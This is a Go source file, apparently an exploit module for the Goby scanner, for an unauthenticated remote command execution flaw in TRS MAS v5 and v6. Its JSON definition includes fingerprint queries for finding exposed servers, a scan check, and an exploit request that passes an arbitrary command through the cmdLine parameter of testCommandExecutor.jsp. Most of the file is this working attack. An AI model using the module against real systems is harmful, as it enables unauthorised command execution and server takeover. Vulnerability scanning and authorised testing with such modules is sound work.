package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "TRS-MAS testCommandExecutor.jsp Remote Command Execution",
  "Description": "<p>TRS MAS is a set of universal media asset management system launched by Beijing Tors Information Technology Co., Ltd. based on the characteristics of audio and video use in the mobile Internet era. The same audio and video resources can be used for different terminal platforms, effectively saving costs. , to simplify the operation.&nbsp;</p><p>There is an unauthorized command execution vulnerability in TRS MAS v5 and v6, which can execute arbitrary commands.<br></p>",
  "Product": "TRS-MAS",
  "Homepage": "http://www.trs.com.cn/",
  "DisclosureDate": "2022-04-28",
  "Author": "liubye",
  "FofaQuery": "header=\"X-Mas-Server\" || banner=\"X-Mas-Server\"",
  "GobyQuery": "header=\"X-Mas-Server\" || banner=\"X-Mas-Server\"",
  "Level": "3",
  "Impact": "<p>There is an unauthorized command execution vulnerability in TRS MAS v5 and v6, which can execute arbitrary commands.<br></p>",
  "Recommendation": "<p>At present, the version affected by the vulnerability has been officially stopped updating. It is recommended to use defense devices for protection.Disable&nbsp;/sysinfo/testCommandExecutor.jsp&nbsp;path access.<br></p>",
  "References": [
    "https://cn-sec.com/archives/966820.html"
  ],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmdLine",
      "type": "input",
      "value": "whoami",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/mas/sysinfo/testCommandExecutor.jsp",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "测试命令行进程执行",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/mas/sysinfo/testCommandExecutor.jsp?cmdLine={{{cmdLine}}}&workDir=&pathEnv=&libPathEnv=",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "测试命令行进程执行",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [
    "Command Execution"
  ],
  "VulType": [
    "Command Execution"
  ],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "9.7",
  "Translation": {
    "CN": {
      "Name": "TRS-MAS 测试文件 testCommandExecutor.jsp 远程命令执行",
      "Product": "拓尔思-MAS",
      "Description": "<p><span style=\"color: rgb(45, 46, 47); font-size: medium;\">TRS MAS是基于移动互联网时代音视频的使用特点，</span><span style=\"color: rgb(45, 46, 47); font-size: medium;\">北京拓尔思信息技术股份有限公司</span><span style=\"color: rgb(45, 46, 47); font-size: medium;\">推出的一套通用型媒资管理系统，同一个音视频资源能面向不同的终端平台提供使用，有效节省成本，简化操作。</span></p><p><span style=\"color: rgb(45, 46, 47); font-size: medium;\">TRS MAS&nbsp;</span><span style=\"color: rgb(45, 46, 47); font-size: medium;\">v5、v6版本存在未授权命令执行漏洞，攻击者可以在未授权情况下在服务器上执行任意命令，获取服务器操作权限。</span><br></p>",
      "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">目前受漏洞影响的版本官方已停止更新，建议使用防御设备进行防护，禁止对&nbsp;<span style=\"color: rgb(0, 0, 0); font-size: 18px;\">/sysinfo/testCommandExecutor.jsp 路径的访问。</span></span><br></p>",
      "Impact": "<p><span style=\"font-size: medium; color: rgb(45, 46, 47);\">TRS MAS&nbsp;</span><span style=\"font-size: medium; color: rgb(45, 46, 47);\">v5、v6版本存在未授权命令执行漏洞，攻击者可以在未授权情况下在服务器上执行任意命令，获取服务器操作权限。</span><br></p>",
      "VulType": [
        "命令执⾏"
      ],
      "Tags": [
        "命令执⾏"
      ]
    },
    "EN": {
      "Name": "TRS-MAS testCommandExecutor.jsp Remote Command Execution",
      "Product": "TRS-MAS",
      "Description": "<p>TRS MAS is a set of universal media asset management system launched by Beijing Tors Information Technology Co., Ltd. based on the characteristics of audio and video use in the mobile Internet era. The same audio and video resources can be used for different terminal platforms, effectively saving costs. , to simplify the operation.&nbsp;</p><p>There is an unauthorized command execution vulnerability in TRS MAS v5 and v6, which can execute arbitrary commands.<br></p>",
      "Recommendation": "<p>At present, the version affected by the vulnerability has been officially stopped updating. It is recommended to use defense devices for protection.Disable&nbsp;/sysinfo/testCommandExecutor.jsp&nbsp;path access.<br></p>",
      "Impact": "<p>There is an unauthorized command execution vulnerability in TRS MAS v5 and v6, which can execute arbitrary commands.<br></p>",
      "VulType": [
        "Command Execution"
      ],
      "Tags": [
        "Command Execution"
      ]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}